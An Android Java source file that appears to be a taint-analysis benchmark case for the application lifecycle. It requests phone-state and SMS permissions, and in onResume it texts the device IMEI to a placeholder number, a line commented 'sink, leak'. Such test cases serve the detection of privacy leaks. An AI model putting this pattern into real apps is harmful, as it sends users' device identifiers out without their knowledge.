package de.ecspride;

import de.ecspride.applicationlifecycle1.R;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS}, PackageManager.PERMISSION_GRANTED);

		((Button) findViewById(R.id.trigger)).setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View view) {
				String packageName = "de.ecspride.applicationlifecycle1";
				startActivity(getPackageManager().getLaunchIntentForPackage(packageName));
			}
		});

	}

	public void onResume() {
        super.onResume();
		if (ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
			if (ApplicationLifecyle1.imei != null) {
				SmsManager sms = SmsManager.getDefault();
				sms.sendTextMessage("+49 1234", null, ApplicationLifecyle1.imei, null, null); //sink, leak
			}
		}
    }
}
